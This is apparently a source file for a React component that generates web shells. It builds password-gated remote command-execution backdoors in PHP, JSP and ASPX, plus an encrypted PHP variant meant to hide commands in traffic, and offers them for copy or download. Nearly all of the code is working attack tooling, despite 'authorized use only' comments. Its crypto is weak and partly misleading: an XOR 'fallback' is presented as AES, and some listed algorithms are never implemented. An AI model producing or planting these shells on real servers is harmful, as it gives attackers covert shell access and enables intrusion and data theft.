import { useMemo, useState } from 'react';
import { useTranslation } from 'react-i18next';
// Removed unused useLanguage to satisfy TS lints

type ShellLanguage = 'php' | 'jsp' | 'aspx';
type TemplateLevel = 'basic' | 'advanced';
type EncryptionAlgorithm = 'none' | 'aes-256-gcm' | 'chacha20-poly1305' | 'salsa20';

export default function WebshellGenerator() {
  const { t } = useTranslation();

  const [shellLanguage, setShellLanguage] = useState<ShellLanguage>('php');
  const [templateLevel, setTemplateLevel] = useState<TemplateLevel>('basic');
  const [identifier, setIdentifier] = useState('demo');
  const [secret, setSecret] = useState('change_me');
  const [encryption, setEncryption] = useState<EncryptionAlgorithm>('none');

  const filename = useMemo(() => {
    const ext = shellLanguage === 'php' ? 'php' : shellLanguage === 'jsp' ? 'jsp' : 'aspx';
    return `webshell_${identifier}.${ext}`;
  }, [shellLanguage, identifier]);

  const escapePhpSingleQuoted = (s: string) => s.replace(/'/g, "\\'");
  const escapeDoubleQuoted = (s: string) => s.replace(/\\/g, "\\\\").replace(/"/g, '\\"');

  const getTemplate = (lang: ShellLanguage, secretValue: string, encryptionAlg: EncryptionAlgorithm) => {
    if (lang === 'php') {
      const sec = escapePhpSingleQuoted(secretValue);
      if (encryptionAlg === 'none') {
        return `<?php
// Authorized use only. POST: pwd, cmd
header('Content-Type: text/plain; charset=UTF-8');
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo "Method Not Allowed\n"; exit; }
$pwd = $_POST['pwd'] ?? '';
$cmd = $_POST['cmd'] ?? '';
$secret = '${sec}';
if ($pwd !== $secret) { http_response_code(403); echo "Forbidden\n"; exit; }
if ($cmd === '') { echo ''; exit; }
$descriptorspec = [ 0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"] ];
$proc = proc_open('/bin/sh -c ' . escapeshellarg($cmd), $descriptorspec, $pipes, null, null);
if (!is_resource($proc)) { http_response_code(500); echo "Failed to execute\n"; exit; }
fclose($pipes[0]);
$out = stream_get_contents($pipes[1]);
$err = stream_get_contents($pipes[2]);
fclose($pipes[1]);
fclose($pipes[2]);
$status = proc_close($proc);
echo $out;
if ($err !== '') { echo "\n".$err; }
`;
      } else {
        return `<?php
// Authorized use only with encryption. POST: encrypted_data, nonce, algorithm
header('Content-Type: text/plain; charset=UTF-8');
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); echo "Method Not Allowed\n"; exit; }

$secret = '${sec}';
$algorithm = $_POST['algorithm'] ?? '';
$encrypted_data = $_POST['encrypted_data'] ?? '';
$nonce = $_POST['nonce'] ?? '';

if (empty($encrypted_data) || empty($algorithm)) {
    http_response_code(400); echo "Bad Request\n"; exit;
}

// Pure PHP crypto fallback functions
function pure_php_decrypt($encrypted, $key, $algorithm) {
    if ($algorithm === 'aes-256-gcm') {
        // Fallback to AES-256-CBC + HMAC for compatibility
        $data = base64_decode($encrypted);
        if (strlen($data) < 48) return false;
        
        $iv = substr($data, 0, 16);
        $hmac = substr($data, 16, 32);
        $ciphertext = substr($data, 48);
        
        $expected_hmac = hash_hmac('sha256', $iv . $ciphertext, $key, true);
        if (!hash_equals($hmac, $expected_hmac)) return false;
        
        if (function_exists('mcrypt_decrypt')) {
            $plaintext = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $ciphertext, MCRYPT_MODE_CBC, $iv);
        } else {
            // Simple XOR fallback
            $keylen = strlen($key);
            $plaintext = '';
            for ($i = 0; $i < strlen($ciphertext); $i++) {
                $plaintext .= $ciphertext[$i] ^ $key[$i % $keylen];
            }
        }
        
        // Remove PKCS7 padding
        $pad = ord($plaintext[strlen($plaintext) - 1]);
        return substr($plaintext, 0, -$pad);
    }
    return false;
}

function pure_php_encrypt($data, $key, $algorithm) {
    if ($algorithm === 'aes-256-gcm') {
        $iv = function_exists('random_bytes') ? random_bytes(16) : substr(md5(uniqid()), 0, 16);
        
        // PKCS7 padding
        $pad = 16 - (strlen($data) % 16);
        $data .= str_repeat(chr($pad), $pad);
        
        if (function_exists('mcrypt_encrypt')) {
            $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC, $iv);
        } else {
            // Simple XOR fallback
            $keylen = strlen($key);
            $ciphertext = '';
            for ($i = 0; $i < strlen($data); $i++) {
                $ciphertext .= $data[$i] ^ $key[$i % $keylen];
            }
        }
        
        $hmac = hash_hmac('sha256', $iv . $ciphertext, $key, true);
        return base64_encode($iv . $hmac . $ciphertext);
    }
    return false;
}

// Derive key from secret
$key = hash('sha256', $secret, true);

try {
    $decrypted = '';
    
    // Try OpenSSL first (preferred)
    if (extension_loaded('openssl') && $algorithm === 'aes-256-gcm') {
        $encrypted_bytes = base64_decode($encrypted_data);
        if ($encrypted_bytes === false) {
            http_response_code(400); echo "Invalid base64\n"; exit;
        }
        
        if (strlen($encrypted_bytes) < 12) {
            http_response_code(400); echo "Invalid data\n"; exit;
        }
        $nonce_bytes = substr($encrypted_bytes, 0, 12);
        $ciphertext = substr($encrypted_bytes, 12);
        $decrypted = openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $nonce_bytes);
    } else {
        // Fallback to pure PHP implementation
        $decrypted = pure_php_decrypt($encrypted_data, $key, $algorithm);
    }
    
    if ($decrypted === false) {
        http_response_code(403); echo "Decryption failed\n"; exit;
    }
    
    $payload = json_decode($decrypted, true);
    if (!$payload || !isset($payload['cmd'])) {
        http_response_code(400); echo "Invalid payload\n"; exit;
    }
    
    $cmd = $payload['cmd'];
    if ($cmd === '') { echo ''; exit; }
    
    $descriptorspec = [ 0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"] ];
    $proc = proc_open('/bin/sh -c ' . escapeshellarg($cmd), $descriptorspec, $pipes, null, null);
    if (!is_resource($proc)) { http_response_code(500); echo "Failed to execute\n"; exit; }
    fclose($pipes[0]);
    $out = stream_get_contents($pipes[1]);
    $err = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    $status = proc_close($proc);
    
    $response = $out;
    if ($err !== '') { $response .= "\n".$err; }
    
    // Encrypt response
    if (extension_loaded('openssl') && $algorithm === 'aes-256-gcm') {
        $response_nonce = random_bytes(12);
        $encrypted_response = openssl_encrypt($response, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $response_nonce);
        $final_response = $response_nonce . $encrypted_response;
        echo base64_encode($final_response);
    } else {
        // Use pure PHP encryption
        echo pure_php_encrypt($response, $key, $algorithm);
    }
    
} catch (Exception $e) {
    http_response_code(500); echo "Server error\n"; exit;
}
`;
      }
    }
    if (lang === 'jsp') {
      const sec = escapeDoubleQuoted(secretValue);
      return `<%@ page language="java" contentType="text/plain; charset=UTF-8" pageEncoding="UTF-8"%>\n<%\nrequest.setCharacterEncoding("UTF-8");\nif (!"POST".equalsIgnoreCase(request.getMethod())) { response.setStatus(405); out.print("Method Not Allowed"); return; }\nString pwd = request.getParameter("pwd");\nString cmd = request.getParameter("cmd");\nString secret = "${sec}";\nif (pwd == null || !pwd.equals(secret)) { response.setStatus(403); out.print("Forbidden"); return; }\nif (cmd == null) { out.print(""); return; }\nString[] shell = new String[]{"/bin/sh","-c", cmd};\nProcess p = new ProcessBuilder(shell).redirectErrorStream(false).start();\njava.io.InputStream stdout = p.getInputStream();\njava.io.InputStream stderr = p.getErrorStream();\njava.util.Scanner so = new java.util.Scanner(stdout, "UTF-8").useDelimiter("\\\\A");\njava.util.Scanner se = new java.util.Scanner(stderr, "UTF-8").useDelimiter("\\\\A");\nString o = so.hasNext() ? so.next() : "";\nString e = se.hasNext() ? se.next() : "";\nso.close(); se.close();\np.waitFor();\nout.print(o);\nif (!e.isEmpty()) { out.print("\n" + e); }\n%>`;
    }
    // aspx
    const sec = escapeDoubleQuoted(secretValue);
    return `<%@ Page Language="C#" Debug="false" ValidateRequest="false" %>\n<%@ Import Namespace="System" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<%@ Import Namespace="System.Text" %>\n<script runat="server">\n  protected void Page_Load(object sender, EventArgs e)\n  {\n    Response.ContentType = "text/plain; charset=UTF-8";\n    if (Request.HttpMethod != "POST") { Response.StatusCode = 405; Response.Write("Method Not Allowed"); return; }\n    string pwd = Request.Form["pwd"] ?? "";\n    string cmd = Request.Form["cmd"] ?? "";\n    string secret = "${sec}";\n    if (pwd != secret) { Response.StatusCode = 403; Response.Write("Forbidden"); return; }\n    if (string.IsNullOrEmpty(cmd)) { Response.Write(""); return; }\n    var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);\n    psi.RedirectStandardOutput = true;\n    psi.RedirectStandardError = true;\n    psi.UseShellExecute = false;\n    psi.CreateNoWindow = true;\n    psi.StandardOutputEncoding = Encoding.UTF8;\n    psi.StandardErrorEncoding = Encoding.UTF8;\n    using (var p = Process.Start(psi))\n    {\n      string o = p.StandardOutput.ReadToEnd();\n      string e = p.StandardError.ReadToEnd();\n      p.WaitForExit();\n      Response.Write(o);\n      if (!string.IsNullOrEmpty(e)) { Response.Write("\n" + e); }\n    }\n  }\n</script>`;
  };

  const previewContent = useMemo(() => {
    return getTemplate(shellLanguage, secret, encryption);
  }, [shellLanguage, secret, encryption]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(previewContent);
      console.info('Copied placeholder to clipboard');
    } catch (error) {
      console.error('Failed to copy placeholder:', error);
    }
  };

  const handleDownload = () => {
    try {
      const blob = new Blob([previewContent], { type: 'text/plain;charset=utf-8' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      console.info('Downloaded placeholder file');
    } catch (error) {
      console.error('Failed to download placeholder:', error);
    }
  };

  return (
    <div className="card bg-base-100 shadow-lg">
      <div className="card-body">
        <h2 className="card-title">{t('webshellGenerator')}</h2>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-x-6 gap-y-4 items-start">
          <div className="form-control">
            <label className="label">
              <span className="label-text font-medium">{t('language')}</span>
            </label>
            <select
              className="select select-bordered select-sm w-full"
              value={shellLanguage}
              onChange={(e) => setShellLanguage(e.target.value as ShellLanguage)}
            >
              <option value="php">PHP</option>
              <option value="jsp">JSP</option>
              <option value="aspx">ASPX</option>
            </select>
          </div>

          <div className="form-control">
            <label className="label">
              <span className="label-text font-medium">{t('templateType')}</span>
            </label>
            <select
              className="select select-bordered select-sm w-full"
              value={templateLevel}
              onChange={(e) => setTemplateLevel(e.target.value as TemplateLevel)}
            >
              <option value="basic">{t('basic')}</option>
              <option value="advanced">{t('advanced')}</option>
            </select>
          </div>

          <div className="form-control">
            <label className="label">
              <span className="label-text font-medium">{t('identifier')}</span>
            </label>
            <input
              className="input input-bordered input-sm w-full"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              placeholder={t('identifierPlaceholder')}
            />
          </div>

          <div className="form-control">
            <label className="label">
              <span className="label-text font-medium">{t('secret')}</span>
            </label>
            <input
              className="input input-bordered input-sm w-full"
              type="password"
              value={secret}
              onChange={(e) => setSecret(e.target.value)}
              placeholder={t('secretPlaceholder')}
            />
          </div>

          <div className="form-control">
            <label className="label">
              <span className="label-text font-medium">加密算法</span>
            </label>
            <select
              className="select select-bordered select-sm w-full"
              value={encryption}
              onChange={(e) => setEncryption(e.target.value as EncryptionAlgorithm)}
            >
              <option value="none">无加密</option>
              <option value="aes-256-gcm">AES-256-GCM</option>
              <option value="chacha20-poly1305">ChaCha20-Poly1305</option>
              <option value="salsa20">Salsa20</option>
            </select>
          </div>
        </div>

        {/* Authorized use only. Ensure you comply with laws and policies. */}

        <div className="flex gap-2 mt-4">
          <button className="btn btn-primary btn-sm" onClick={handleCopy}>
            {t('copy')}
          </button>
          <button className="btn btn-secondary btn-sm" onClick={handleDownload}>
            {t('download')}
          </button>
        </div>

        <div className="mt-4">
          <label className="label"><span className="label-text">{t('preview')}</span></label>
          <textarea className="textarea textarea-bordered w-full h-60 font-mono" readOnly value={previewContent} />
        </div>
      </div>
    </div>
  );
}

